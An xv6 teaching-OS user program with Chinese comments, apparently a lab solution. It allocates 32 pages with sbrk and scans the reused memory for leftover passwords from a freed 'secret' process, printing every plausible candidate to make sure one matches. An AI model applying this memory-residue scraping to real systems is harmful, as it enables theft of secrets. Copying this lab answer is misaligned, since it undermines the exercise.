#include "kernel/types.h"
#include "user/user.h"

int
main(int argc, char *argv[])
{
  // 1. 申请 32 个页面的物理内存（131072 字节），将 secret 释放的页全部霸占过来
  int pages = 32;
  char *mem = sbrk(pages * 4096);
  
  if (mem == (char*)-1) {
    exit(1);
  }

  // 2. 深度扫描整块内存区域
  for (int i = 0; i < pages * 4096 - 32; i++) {
    char *str = &mem[i];
    
    // 判断当前字符是否为字母或数字
    int is_alpha = (str[0] >= 'a' && str[0] <= 'z') ||
                   (str[0] >= 'A' && str[0] <= 'Z') ||
                   (str[0] >= '0' && str[0] <= '9');
                          
    if (is_alpha) {
      int len = 0;
      while ((str[len] >= 'a' && str[len] <= 'z') ||
             (str[len] >= 'A' && str[len] <= 'Z') ||
             (str[len] >= '0' && str[len] <= '9')) {
        len++;
      }
      
   
    	//捕捉官方 8 字符的密码（如 biJ2VV1J）
      if (len >= 5 && len <= 15 && str[len] == '\0') {
        // 独立一行打印出这个高危候选词
        printf("%s\n", str);
        

        // 绝不中途退出，把整块内存里的可疑长字符串全部打印出来，确保百分之百命中！
      }
      
      // 跳过当前已扫描完的单词单词后缀，避免重复打印子字符串
      if (len > 0) {
        i += len - 1;
      }
    }
  }

  exit(0);
}
